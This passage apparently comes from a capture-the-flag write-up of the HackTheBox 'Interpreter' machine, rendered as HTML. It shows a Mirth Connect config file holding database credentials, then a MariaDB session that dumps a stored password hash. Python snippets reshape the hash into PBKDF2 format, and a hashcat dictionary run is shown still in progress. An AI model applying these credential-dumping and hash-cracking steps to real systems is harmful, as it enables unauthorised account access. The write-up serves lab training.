+<span class="n">https</span><span class="o">.</span><span class="n">server</span><span class="o">.</span><span class="n">protocols</span> <span class="o">=</span> <span class="n">TLSv1</span><span class="mf">.3</span><span class="p">,</span><span class="n">TLSv1</span><span class="mf">.2</span><span class="p">,</span><span class="n">SSLv2Hello</span>
+<span class="n">https</span><span class="o">.</span><span class="n">ciphersuites</span> <span class="o">=</span> <span class="n">TLS_CHACHA20_POLY1305_SHA256</span><span class="p">,</span><span class="n">TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256</span><span class="p">,</span><span class="n">TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256</span><span class="p">,</span><span class="n">TLS_DHE_RSA_WITH_CHACHA20_POLY1305_SHA256</span><span class="p">,</span><span class="n">TLS_AES_256_GCM_SHA384</span><span class="p">,</span><span class="n">TLS_AES_128_GCM_SHA256</span><span class="p">,</span><span class="n">TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384</span><span class="p">,</span><span class="n">TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384</span><span class="p">,</span><span class="n">TLS_RSA_WITH_AES_256_GCM_SHA384</span><span class="p">,</span><span class="n">TLS_ECDH_ECDSA_WITH_AES_256_GCM_SHA384</span><span class="p">,</span><span class="n">TLS_ECDH_RSA_WITH_AES_256_GCM_SHA384</span><span class="p">,</span><span class="n">TLS_DHE_RSA_WITH_AES_256_GCM_SHA384</span><span class="p">,</span><span class="n">TLS_DHE_DSS_WITH_AES_256_GCM_SHA384</span><span class="p">,</span><span class="n">TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256</span><span class="p">,</span><span class="n">TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256</span><span class="p">,</span><span class="n">TLS_RSA_WITH_AES_128_GCM_SHA256</span><span class="p">,</span><span class="n">TLS_ECDH_ECDSA_WITH_AES_128_GCM_SHA256</span><span class="p">,</span><span class="n">TLS_ECDH_RSA_WITH_AES_128_GCM_SHA256</span><span class="p">,</span><span class="n">TLS_DHE_RSA_WITH_AES_128_GCM_SHA256</span><span class="p">,</span><span class="n">TLS_DHE_DSS_WITH_AES_128_GCM_SHA256</span><span class="p">,</span><span class="n">TLS_EMPTY_RENEGOTIATION_INFO_SCSV</span>
+<span class="n">https</span><span class="o">.</span><span class="n">ephemeraldhkeysize</span> <span class="o">=</span> <span class="mi">2048</span>
+
+<span class="c1"># If set to true, the Connect REST API will require all incoming requests to contain an &quot;X-Requested-With&quot; header.</span>
+<span class="c1"># This protects against Cross-Site Request Forgery (CSRF) security vulnerabilities.</span>
+<span class="n">server</span><span class="o">.</span><span class="n">api</span><span class="o">.</span><span class="n">require</span><span class="o">-</span><span class="n">requested</span><span class="o">-</span><span class="k">with</span> <span class="o">=</span> <span class="n">true</span>
+
+<span class="c1"># CORS headers</span>
+<span class="n">server</span><span class="o">.</span><span class="n">api</span><span class="o">.</span><span class="n">accesscontrolalloworigin</span> <span class="o">=</span> <span class="o">*</span>
+<span class="n">server</span><span class="o">.</span><span class="n">api</span><span class="o">.</span><span class="n">accesscontrolallowcredentials</span> <span class="o">=</span> <span class="n">false</span>
+<span class="n">server</span><span class="o">.</span><span class="n">api</span><span class="o">.</span><span class="n">accesscontrolallowmethods</span> <span class="o">=</span> <span class="n">GET</span><span class="p">,</span> <span class="n">POST</span><span class="p">,</span> <span class="n">DELETE</span><span class="p">,</span> <span class="n">PUT</span>
+<span class="n">server</span><span class="o">.</span><span class="n">api</span><span class="o">.</span><span class="n">accesscontrolallowheaders</span> <span class="o">=</span> <span class="n">Content</span><span class="o">-</span><span class="n">Type</span>
+<span class="n">server</span><span class="o">.</span><span class="n">api</span><span class="o">.</span><span class="n">accesscontrolexposeheaders</span> <span class="o">=</span>
+<span class="n">server</span><span class="o">.</span><span class="n">api</span><span class="o">.</span><span class="n">accesscontrolmaxage</span> <span class="o">=</span>
+
+<span class="c1"># Determines whether or not channels are deployed on server startup.</span>
+<span class="n">server</span><span class="o">.</span><span class="n">startupdeploy</span> <span class="o">=</span> <span class="n">true</span>
+
+<span class="c1"># Determines whether libraries in the custom-lib directory will be included on the server classpath.</span>
+<span class="c1"># To reduce potential classpath conflicts you should create Resources and use them on specific channels/connectors instead, and then set this value to false.</span>
+<span class="n">server</span><span class="o">.</span><span class="n">includecustomlib</span> <span class="o">=</span> <span class="n">true</span>
+
+<span class="c1"># administrator</span>
+<span class="n">administrator</span><span class="o">.</span><span class="n">maxheapsize</span> <span class="o">=</span> <span class="mi">512</span><span class="n">m</span>
+
+<span class="c1"># properties file that will store the configuration map and be loaded during server startup</span>
+<span class="n">configurationmap</span><span class="o">.</span><span class="n">path</span> <span class="o">=</span> <span class="err">$</span><span class="p">{</span><span class="nb">dir</span><span class="o">.</span><span class="n">appdata</span><span class="p">}</span><span class="o">/</span><span class="n">configuration</span><span class="o">.</span><span class="n">properties</span>
+
+<span class="c1"># The language version for the Rhino JavaScript engine (supported values: 1.0, 1.1, ..., 1.8, es6).</span>
+<span class="n">rhino</span><span class="o">.</span><span class="n">languageversion</span> <span class="o">=</span> <span class="n">es6</span>
+
+<span class="c1"># options: derby, mysql, postgres, oracle, sqlserver</span>
+<span class="n">database</span> <span class="o">=</span> <span class="n">mysql</span>
+
+<span class="c1"># examples:</span>
+<span class="c1">#   Derby                       jdbc:derby:${dir.appdata}/mirthdb;create=true</span>
+<span class="c1">#   PostgreSQL                  jdbc:postgresql://localhost:5432/mirthdb</span>
+<span class="c1">#   MySQL                       jdbc:mysql://localhost:3306/mirthdb</span>
+<span class="c1">#   Oracle                      jdbc:oracle:thin:@localhost:1521:DB</span>
+<span class="c1">#   SQL Server/Sybase (jTDS)    jdbc:jtds:sqlserver://localhost:1433/mirthdb</span>
+<span class="c1">#   Microsoft SQL Server        jdbc:sqlserver://localhost:1433;databaseName=mirthdb</span>
+<span class="c1">#   If you are using the Microsoft SQL Server driver, please also specify database.driver below</span>
+<span class="n">database</span><span class="o">.</span><span class="n">url</span> <span class="o">=</span> <span class="n">jdbc</span><span class="p">:</span><span class="n">mariadb</span><span class="p">:</span><span class="o">//</span><span class="n">localhost</span><span class="p">:</span><span class="mi">3306</span><span class="o">/</span><span class="n">mc_bdd_prod</span>
+
+<span class="c1"># If using a custom or non-default driver, specify it here.</span>
+<span class="c1"># example:</span>
+<span class="c1"># Microsoft SQL server: database.driver = com.microsoft.sqlserver.jdbc.SQLServerDriver</span>
+<span class="c1"># (Note: the jTDS driver is used by default for sqlserver)</span>
+<span class="n">database</span><span class="o">.</span><span class="n">driver</span> <span class="o">=</span> <span class="n">org</span><span class="o">.</span><span class="n">mariadb</span><span class="o">.</span><span class="n">jdbc</span><span class="o">.</span><span class="n">Driver</span>
+
+<span class="c1"># Maximum number of connections allowed for the main read/write connection pool</span>
+<span class="n">database</span><span class="o">.</span><span class="n">max</span><span class="o">-</span><span class="n">connections</span> <span class="o">=</span> <span class="mi">20</span>
+<span class="c1"># Maximum number of connections allowed for the read-only connection pool</span>
+<span class="n">database</span><span class="o">-</span><span class="n">readonly</span><span class="o">.</span><span class="n">max</span><span class="o">-</span><span class="n">connections</span> <span class="o">=</span> <span class="mi">20</span>
+
+<span class="c1"># database credentials</span>
+<span class="n">database</span><span class="o">.</span><span class="n">username</span> <span class="o">=</span> <span class="n">mirthdb</span>
+<span class="n">database</span><span class="o">.</span><span class="n">password</span> <span class="o">=</span> <span class="n">MirthPass123</span><span class="err">!</span>
+
+<span class="c1">#On startup, Maximum number of retries to establish database connections in case of failure</span>
+<span class="n">database</span><span class="o">.</span><span class="n">connection</span><span class="o">.</span><span class="n">maxretry</span> <span class="o">=</span> <span class="mi">2</span>
+
+<span class="c1">#On startup, Maximum wait time in milliseconds for retry to establish database connections in case of failure</span>
+<span class="n">database</span><span class="o">.</span><span class="n">connection</span><span class="o">.</span><span class="n">retrywaitinmilliseconds</span> <span class="o">=</span> <span class="mi">10000</span>
+
+<span class="c1"># If true, various read-only statements are separated into their own connection pool.</span>
+<span class="c1"># By default the read-only pool will use the same connection information as the master pool,</span>
+<span class="c1"># but you can change this with the &quot;database-readonly&quot; options. For example, to point the</span>
+<span class="c1"># read-only pool to a different JDBC URL:</span>
+<span class="c1">#</span>
+<span class="c1"># database-readonly.url = jdbc:...</span>
+<span class="c1">#</span>
+<span class="n">database</span><span class="o">.</span><span class="n">enable</span><span class="o">-</span><span class="n">read</span><span class="o">-</span><span class="n">write</span><span class="o">-</span><span class="n">split</span> <span class="o">=</span> <span class="n">true</span>
+</code></pre></div>
+<h3 id="mariadb">MariaDB</h3>
+<div class="highlight"><pre><span></span><code><span class="n">mirth</span><span class="nd">@interpreter</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">mirthconnect</span><span class="o">/</span><span class="n">conf</span><span class="err">$</span> <span class="n">mysql</span> <span class="o">-</span><span class="n">u</span> <span class="n">mirthdb</span> <span class="o">-</span><span class="n">p</span>
+<span class="n">Enter</span> <span class="n">password</span><span class="p">:</span>
+<span class="n">Welcome</span> <span class="n">to</span> <span class="n">the</span> <span class="n">MariaDB</span> <span class="n">monitor</span><span class="o">.</span>  <span class="n">Commands</span> <span class="n">end</span> <span class="k">with</span> <span class="p">;</span> <span class="ow">or</span> \<span class="n">g</span><span class="o">.</span>
+<span class="n">Your</span> <span class="n">MariaDB</span> <span class="n">connection</span> <span class="nb">id</span> <span class="ow">is</span> <span class="mi">38</span>
+<span class="n">Server</span> <span class="n">version</span><span class="p">:</span> <span class="mf">10.11.14</span><span class="o">-</span><span class="n">MariaDB</span><span class="o">-</span><span class="mi">0</span><span class="o">+</span><span class="n">deb12u2</span> <span class="n">Debian</span> <span class="mi">12</span>
+
+<span class="n">Copyright</span> <span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="mi">2000</span><span class="p">,</span> <span class="mi">2018</span><span class="p">,</span> <span class="n">Oracle</span><span class="p">,</span> <span class="n">MariaDB</span> <span class="n">Corporation</span> <span class="n">Ab</span> <span class="ow">and</span> <span class="n">others</span><span class="o">.</span>
+
+<span class="n">Type</span> <span class="s1">&#39;help;&#39;</span> <span class="ow">or</span> <span class="s1">&#39;\h&#39;</span> <span class="k">for</span> <span class="n">help</span><span class="o">.</span> <span class="n">Type</span> <span class="s1">&#39;\c&#39;</span> <span class="n">to</span> <span class="n">clear</span> <span class="n">the</span> <span class="n">current</span> <span class="nb">input</span> <span class="n">statement</span><span class="o">.</span>
+
+<span class="n">MariaDB</span> <span class="p">[(</span><span class="n">none</span><span class="p">)]</span><span class="o">&gt;</span> <span class="n">show</span> <span class="n">databases</span><span class="p">;</span>
+<span class="o">+--------------------+</span>
+<span class="o">|</span> <span class="n">Database</span>           <span class="o">|</span>
+<span class="o">+--------------------+</span>
+<span class="o">|</span> <span class="n">information_schema</span> <span class="o">|</span>
+<span class="o">|</span> <span class="n">mc_bdd_prod</span>        <span class="o">|</span>
+<span class="o">+--------------------+</span>
+<span class="mi">2</span> <span class="n">rows</span> <span class="ow">in</span> <span class="nb">set</span> <span class="p">(</span><span class="mf">0.001</span> <span class="n">sec</span><span class="p">)</span>
+
+<span class="n">MariaDB</span> <span class="p">[(</span><span class="n">none</span><span class="p">)]</span><span class="o">&gt;</span> <span class="n">use</span> <span class="n">mc_bdd_prod</span><span class="p">;</span>
+<span class="n">Reading</span> <span class="n">table</span> <span class="n">information</span> <span class="k">for</span> <span class="n">completion</span> <span class="n">of</span> <span class="n">table</span> <span class="ow">and</span> <span class="n">column</span> <span class="n">names</span>
+<span class="n">You</span> <span class="n">can</span> <span class="n">turn</span> <span class="n">off</span> <span class="n">this</span> <span class="n">feature</span> <span class="n">to</span> <span class="n">get</span> <span class="n">a</span> <span class="n">quicker</span> <span class="n">startup</span> <span class="k">with</span> <span class="o">-</span><span class="n">A</span>
+
+<span class="n">Database</span> <span class="n">changed</span>
+<span class="n">MariaDB</span> <span class="p">[</span><span class="n">mc_bdd_prod</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">show</span> <span class="n">tables</span><span class="p">;</span>
+<span class="o">+-----------------------+</span>
+<span class="o">|</span> <span class="n">Tables_in_mc_bdd_prod</span> <span class="o">|</span>
+<span class="o">+-----------------------+</span>
+<span class="o">|</span> <span class="n">ALERT</span>                 <span class="o">|</span>
+<span class="o">|</span> <span class="n">CHANNEL</span>               <span class="o">|</span>
+<span class="o">|</span> <span class="n">CHANNEL_GROUP</span>         <span class="o">|</span>
+<span class="o">|</span> <span class="n">CODE_TEMPLATE</span>         <span class="o">|</span>
+<span class="o">|</span> <span class="n">CODE_TEMPLATE_LIBRARY</span> <span class="o">|</span>
+<span class="o">|</span> <span class="n">CONFIGURATION</span>         <span class="o">|</span>
+<span class="o">|</span> <span class="n">DEBUGGER_USAGE</span>        <span class="o">|</span>
+<span class="o">|</span> <span class="n">D_CHANNELS</span>            <span class="o">|</span>
+<span class="o">|</span> <span class="n">D_M1</span>                  <span class="o">|</span>
+<span class="o">|</span> <span class="n">D_MA1</span>                 <span class="o">|</span>
+<span class="o">|</span> <span class="n">D_MC1</span>                 <span class="o">|</span>
+<span class="o">|</span> <span class="n">D_MCM1</span>                <span class="o">|</span>
+<span class="o">|</span> <span class="n">D_MM1</span>                 <span class="o">|</span>
+<span class="o">|</span> <span class="n">D_MS1</span>                 <span class="o">|</span>
+<span class="o">|</span> <span class="n">D_MSQ1</span>                <span class="o">|</span>
+<span class="o">|</span> <span class="n">EVENT</span>                 <span class="o">|</span>
+<span class="o">|</span> <span class="n">PERSON</span>                <span class="o">|</span>
+<span class="o">|</span> <span class="n">PERSON_PASSWORD</span>       <span class="o">|</span>
+<span class="o">|</span> <span class="n">PERSON_PREFERENCE</span>     <span class="o">|</span>
+<span class="o">|</span> <span class="n">SCHEMA_INFO</span>           <span class="o">|</span>
+<span class="o">|</span> <span class="n">SCRIPT</span>                <span class="o">|</span>
+<span class="o">+-----------------------+</span>
+<span class="mi">21</span> <span class="n">rows</span> <span class="ow">in</span> <span class="nb">set</span> <span class="p">(</span><span class="mf">0.000</span> <span class="n">sec</span><span class="p">)</span>
+
+<span class="n">MariaDB</span> <span class="p">[</span><span class="n">mc_bdd_prod</span><span class="p">]</span><span class="o">&gt;</span> <span class="n">select</span> <span class="o">*</span> <span class="kn">from</span> <span class="nn">PERSON_PASSWORD</span>
+    <span class="o">-&gt;</span> <span class="p">;</span>
+<span class="o">+-----------+----------------------------------------------------------+---------------------+</span>
+<span class="o">|</span> <span class="n">PERSON_ID</span> <span class="o">|</span> <span class="n">PASSWORD</span>                                                 <span class="o">|</span> <span class="n">PASSWORD_DATE</span>       <span class="o">|</span>
+<span class="o">+-----------+----------------------------------------------------------+---------------------+</span>
+<span class="o">|</span>         <span class="mi">2</span> <span class="o">|</span> <span class="n">u</span><span class="o">/+</span><span class="n">LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA</span><span class="o">/</span><span class="n">kLMt3w</span><span class="o">+</span><span class="n">w</span><span class="o">==</span> <span class="o">|</span> <span class="mi">2025</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">19</span> <span class="mi">09</span><span class="p">:</span><span class="mi">22</span><span class="p">:</span><span class="mi">28</span> <span class="o">|</span>
+<span class="o">+-----------+----------------------------------------------------------+---------------------+</span>
+<span class="mi">1</span> <span class="n">row</span> <span class="ow">in</span> <span class="nb">set</span> <span class="p">(</span><span class="mf">0.000</span> <span class="n">sec</span><span class="p">)</span>
+
+<span class="n">MariaDB</span> <span class="p">[</span><span class="n">mc_bdd_prod</span><span class="p">]</span><span class="o">&gt;</span>
+</code></pre></div>
+<h3 id="identifying-hash">Identifying hash</h3>
+<div class="highlight"><pre><span></span><code><span class="n">echo</span> <span class="s1">&#39;u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==&#39;</span> <span class="o">|</span> <span class="n">base64</span> <span class="o">-</span><span class="n">d</span> <span class="o">|</span> <span class="n">wc</span> <span class="o">-</span><span class="n">c</span>
+<span class="mi">40</span>
+</code></pre></div>
+<p>SHA256 -&gt; 32 bytes</p>
+<p>but 40 bytes..</p>
+<p>that usually means:</p>
+<blockquote>
+<p>8 bytes salt + 32 bytes hash</p>
+</blockquote>
+<p>Confirmation:</p>
+<div class="highlight"><pre><span></span><code><span class="n">python3</span> <span class="o">-</span> <span class="o">&lt;&lt;</span> <span class="s1">&#39;EOF&#39;</span>  
+<span class="kn">import</span> <span class="nn">base64</span>  
+<span class="n">data</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="s2">&quot;u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==&quot;</span><span class="p">)</span>  
+
+<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Total bytes:&quot;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">))</span>  
+<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Salt bytes:&quot;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">[:</span><span class="mi">8</span><span class="p">]))</span>  
+<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Hash bytes:&quot;</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">8</span><span class="p">:]))</span>  
+<span class="n">EOF</span>
+</code></pre></div>
+<p>PBKDF2-HMAC-SHA256</p>
+<div class="highlight"><pre><span></span><code><span class="n">python3</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&quot; import base64 data = base64.b64decode(&#39;u/+LBBOUnadiyFBsMOoIDPLbUR0rk59kEkPU17itdrVWA/kLMt3w+w==&#39;) salt = base64.b64encode(data[:8]).decode() hash_ = base64.b64encode(data[8:]).decode() print(f&#39;sha256:600000:</span><span class="si">{salt}</span><span class="s2">:</span><span class="si">{hash_}</span><span class="s2">&#39;) &quot;</span>
+</code></pre></div>
+<h3 id="hashcat">Hashcat</h3>
+<div class="highlight"><pre><span></span><code><span class="err">☠</span>  <span class="n">hyperc</span> <span class="o">/</span><span class="n">mnt</span><span class="o">/</span><span class="n">c</span><span class="o">/</span><span class="n">Users</span><span class="o">/</span><span class="n">cesar</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">Machines</span><span class="o">/</span><span class="n">Interpreter</span> <span class="err">➜</span>  <span class="n">hashcat</span> <span class="o">-</span><span class="n">m</span> <span class="mi">10900</span> <span class="n">hash_final</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">rockyou</span><span class="o">.</span><span class="n">txt</span>
+<span class="n">hashcat</span> <span class="p">(</span><span class="n">v7</span><span class="mf">.1.2</span><span class="p">)</span> <span class="n">starting</span>
+
+<span class="n">OpenCL</span> <span class="n">API</span> <span class="p">(</span><span class="n">OpenCL</span> <span class="mf">3.0</span> <span class="n">PoCL</span> <span class="mf">6.0</span><span class="o">+</span><span class="n">debian</span>  <span class="n">Linux</span><span class="p">,</span> <span class="kc">None</span><span class="o">+</span><span class="n">Asserts</span><span class="p">,</span> <span class="n">RELOC</span><span class="p">,</span> <span class="n">SPIR</span><span class="o">-</span><span class="n">V</span><span class="p">,</span> <span class="n">LLVM</span> <span class="mf">18.1.8</span><span class="p">,</span> <span class="n">SLEEF</span><span class="p">,</span> <span class="n">DISTRO</span><span class="p">,</span> <span class="n">POCL_DEBUG</span><span class="p">)</span> <span class="o">-</span> <span class="n">Platform</span> <span class="c1">#1 [The pocl project]</span>
+<span class="o">====================================================================================================================================================</span>
+<span class="o">*</span> <span class="n">Device</span> <span class="c1">#01: cpu-haswell-AMD Ryzen 7 6800HS with Radeon Graphics, 2759/5518 MB (1024 MB allocatable), 16MCU</span>
+
+<span class="n">Minimum</span> <span class="n">password</span> <span class="n">length</span> <span class="n">supported</span> <span class="n">by</span> <span class="n">kernel</span><span class="p">:</span> <span class="mi">0</span>
+<span class="n">Maximum</span> <span class="n">password</span> <span class="n">length</span> <span class="n">supported</span> <span class="n">by</span> <span class="n">kernel</span><span class="p">:</span> <span class="mi">256</span>
+<span class="n">Minimum</span> <span class="n">salt</span> <span class="n">length</span> <span class="n">supported</span> <span class="n">by</span> <span class="n">kernel</span><span class="p">:</span> <span class="mi">0</span>
+<span class="n">Maximum</span> <span class="n">salt</span> <span class="n">length</span> <span class="n">supported</span> <span class="n">by</span> <span class="n">kernel</span><span class="p">:</span> <span class="mi">256</span>
+
+<span class="n">Hashes</span><span class="p">:</span> <span class="mi">1</span> <span class="n">digests</span><span class="p">;</span> <span class="mi">1</span> <span class="n">unique</span> <span class="n">digests</span><span class="p">,</span> <span class="mi">1</span> <span class="n">unique</span> <span class="n">salts</span>
+<span class="n">Bitmaps</span><span class="p">:</span> <span class="mi">16</span> <span class="n">bits</span><span class="p">,</span> <span class="mi">65536</span> <span class="n">entries</span><span class="p">,</span> <span class="mh">0x0000ffff</span> <span class="n">mask</span><span class="p">,</span> <span class="mi">262144</span> <span class="nb">bytes</span><span class="p">,</span> <span class="mi">5</span><span class="o">/</span><span class="mi">13</span> <span class="n">rotates</span>
+<span class="n">Rules</span><span class="p">:</span> <span class="mi">1</span>
+
+<span class="n">Optimizers</span> <span class="n">applied</span><span class="p">:</span>
+<span class="o">*</span> <span class="n">Zero</span><span class="o">-</span><span class="n">Byte</span>
+<span class="o">*</span> <span class="n">Single</span><span class="o">-</span><span class="n">Hash</span>
+<span class="o">*</span> <span class="n">Single</span><span class="o">-</span><span class="n">Salt</span>
+<span class="o">*</span> <span class="n">Slow</span><span class="o">-</span><span class="n">Hash</span><span class="o">-</span><span class="n">SIMD</span><span class="o">-</span><span class="n">LOOP</span>
+
+<span class="n">Watchdog</span><span class="p">:</span> <span class="n">Temperature</span> <span class="n">abort</span> <span class="n">trigger</span> <span class="nb">set</span> <span class="n">to</span> <span class="mi">90</span><span class="n">c</span>
+
+<span class="n">Host</span> <span class="n">memory</span> <span class="n">allocated</span> <span class="k">for</span> <span class="n">this</span> <span class="n">attack</span><span class="p">:</span> <span class="mi">516</span> <span class="n">MB</span> <span class="p">(</span><span class="mi">6286</span> <span class="n">MB</span> <span class="n">free</span><span class="p">)</span>
+
+<span class="n">Dictionary</span> <span class="n">cache</span> <span class="n">hit</span><span class="p">:</span>
+<span class="o">*</span> <span class="n">Filename</span><span class="o">..</span><span class="p">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">rockyou</span><span class="o">.</span><span class="n">txt</span>
+<span class="o">*</span> <span class="n">Passwords</span><span class="o">.</span><span class="p">:</span> <span class="mi">14344385</span>
+<span class="o">*</span> <span class="n">Bytes</span><span class="o">.....</span><span class="p">:</span> <span class="mi">139921507</span>
+<span class="o">*</span> <span class="n">Keyspace</span><span class="o">..</span><span class="p">:</span> <span class="mi">14344385</span>
+
+<span class="n">Cracking</span> <span class="n">performance</span> <span class="n">lower</span> <span class="n">than</span> <span class="n">expected</span><span class="err">?</span>
+
+<span class="o">*</span> <span class="n">Append</span> <span class="o">-</span><span class="n">w</span> <span class="mi">3</span> <span class="n">to</span> <span class="n">the</span> <span class="n">commandline</span><span class="o">.</span>
+  <span class="n">This</span> <span class="n">can</span> <span class="n">cause</span> <span class="n">your</span> <span class="n">screen</span> <span class="n">to</span> <span class="n">lag</span><span class="o">.</span>
+
+<span class="o">*</span> <span class="n">Append</span> <span class="o">-</span><span class="n">S</span> <span class="n">to</span> <span class="n">the</span> <span class="n">commandline</span><span class="o">.</span>
+  <span class="n">This</span> <span class="n">has</span> <span class="n">a</span> <span class="n">drastic</span> <span class="n">speed</span> <span class="n">impact</span> <span class="n">but</span> <span class="n">can</span> <span class="n">be</span> <span class="n">better</span> <span class="k">for</span> <span class="n">specific</span> <span class="n">attacks</span><span class="o">.</span>
+  <span class="n">Typical</span> <span class="n">scenarios</span> <span class="n">are</span> <span class="n">a</span> <span class="n">small</span> <span class="n">wordlist</span> <span class="n">but</span> <span class="n">a</span> <span class="n">large</span> <span class="n">ruleset</span><span class="o">.</span>
+
+<span class="o">*</span> <span class="n">Update</span> <span class="n">your</span> <span class="n">backend</span> <span class="n">API</span> <span class="n">runtime</span> <span class="o">/</span> <span class="n">driver</span> <span class="n">the</span> <span class="n">right</span> <span class="n">way</span><span class="p">:</span>
+  <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">hashcat</span><span class="o">.</span><span class="n">net</span><span class="o">/</span><span class="n">faq</span><span class="o">/</span><span class="n">wrongdriver</span>
+
+<span class="o">*</span> <span class="n">Create</span> <span class="n">more</span> <span class="n">work</span> <span class="n">items</span> <span class="n">to</span> <span class="n">make</span> <span class="n">use</span> <span class="n">of</span> <span class="n">your</span> <span class="n">parallelization</span> <span class="n">power</span><span class="p">:</span>
+  <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">hashcat</span><span class="o">.</span><span class="n">net</span><span class="o">/</span><span class="n">faq</span><span class="o">/</span><span class="n">morework</span>
+
+<span class="p">[</span><span class="n">s</span><span class="p">]</span><span class="n">tatus</span> <span class="p">[</span><span class="n">p</span><span class="p">]</span><span class="n">ause</span> <span class="p">[</span><span class="n">b</span><span class="p">]</span><span class="n">ypass</span> <span class="p">[</span><span class="n">c</span><span class="p">]</span><span class="n">heckpoint</span> <span class="p">[</span><span class="n">f</span><span class="p">]</span><span class="n">inish</span> <span class="p">[</span><span class="n">q</span><span class="p">]</span><span class="n">uit</span> <span class="o">=&gt;</span> <span class="n">s</span>
+
+<span class="n">Session</span><span class="o">..........</span><span class="p">:</span> <span class="n">hashcat</span>
+<span class="n">Status</span><span class="o">...........</span><span class="p">:</span> <span class="n">Running</span>
+<span class="n">Hash</span><span class="o">.</span><span class="n">Mode</span><span class="o">........</span><span class="p">:</span> <span class="mi">10900</span> <span class="p">(</span><span class="n">PBKDF2</span><span class="o">-</span><span class="n">HMAC</span><span class="o">-</span><span class="n">SHA256</span><span class="p">)</span>
+<span class="n">Hash</span><span class="o">.</span><span class="n">Target</span><span class="o">......</span><span class="p">:</span> <span class="n">sha256</span><span class="p">:</span><span class="mi">600000</span><span class="p">:</span><span class="n">u</span><span class="o">/+</span><span class="n">LBBOUnac</span><span class="o">=</span><span class="p">:</span><span class="n">YshQbDDqCAzy21EdK5OfZBJD</span><span class="o">...</span><span class="n">Ld8Ps</span><span class="o">=</span>
+<span class="n">Time</span><span class="o">.</span><span class="n">Started</span><span class="o">.....</span><span class="p">:</span> <span class="n">Sat</span> <span class="n">Feb</span> <span class="mi">21</span> <span class="mi">18</span><span class="p">:</span><span class="mi">05</span><span class="p">:</span><span class="mi">42</span> <span class="mi">2026</span> <span class="p">(</span><span class="mi">23</span> <span class="n">secs</span><span class="p">)</span>
+<span class="n">Time</span><span class="o">.</span><span class="n">Estimated</span><span class="o">...</span><span class="p">:</span> <span class="n">Mon</span> <span class="n">Feb</span> <span class="mi">23</span> <span class="mi">01</span><span class="p">:</span><span class="mi">27</span><span class="p">:</span><span class="mi">07</span> <span class="mi">2026</span> <span class="p">(</span><span class="mi">1</span> <span class="n">day</span><span class="p">,</span> <span class="mi">7</span> <span class="n">hours</span><span class="p">)</span>
+<span class="n">Kernel</span><span class="o">.</span><span class="n">Feature</span><span class="o">...</span><span class="p">:</span> <span class="n">Pure</span> <span class="n">Kernel</span> <span class="p">(</span><span class="n">password</span> <span class="n">length</span> <span class="mi">0</span><span class="o">-</span><span class="mi">256</span> <span class="nb">bytes</span><span class="p">)</span>
+<span class="n">Guess</span><span class="o">.</span><span class="n">Base</span><span class="o">.......</span><span class="p">:</span> <span class="n">File</span> <span class="p">(</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">rockyou</span><span class="o">.</span><span class="n">txt</span><span class="p">)</span>
+<span class="n">Guess</span><span class="o">.</span><span class="n">Queue</span><span class="o">......</span><span class="p">:</span> <span class="mi">1</span><span class="o">/</span><span class="mi">1</span> <span class="p">(</span><span class="mf">100.00</span><span class="o">%</span><span class="p">)</span>
+<span class="n">Speed</span><span class="o">.</span><span class="c1">#01........:      127 H/s (14.60ms) @ Accel:70 Loops:1000 Thr:1 Vec:8</span>
+<span class="n">Recovered</span><span class="o">........</span><span class="p">:</span> <span class="mi">0</span><span class="o">/</span><span class="mi">1</span> <span class="p">(</span><span class="mf">0.00</span><span class="o">%</span><span class="p">)</span> <span class="n">Digests</span> <span class="p">(</span><span class="n">total</span><span class="p">),</span> <span class="mi">0</span><span class="o">/</span><span class="mi">1</span> <span class="p">(</span><span class="mf">0.00</span><span class="o">%</span><span class="p">)</span> <span class="n">Digests</span> <span class="p">(</span><span class="n">new</span><span class="p">)</span>
+<span class="n">Progress</span><span class="o">.........</span><span class="p">:</span> <span class="mi">2240</span><span class="o">/</span><span class="mi">14344385</span> <span class="p">(</span><span class="mf">0.02</span><span class="o">%</span><span class="p">)</span>
+<span class="n">Rejected</span><span class="o">.........</span><span class="p">:</span> <span class="mi">0</span><span class="o">/</span><span class="mi">2240</span> <span class="p">(</span><span class="mf">0.00</span><span class="o">%</span><span class="p">)</span>
+<span class="n">Restore</span><span class="o">.</span><span class="n">Point</span><span class="o">....</span><span class="p">:</span> <span class="mi">2240</span><span class="o">/</span><span class="mi">14344385</span> <span class="p">(</span><span class="mf">0.02</span><span class="o">%</span><span class="p">)</span>
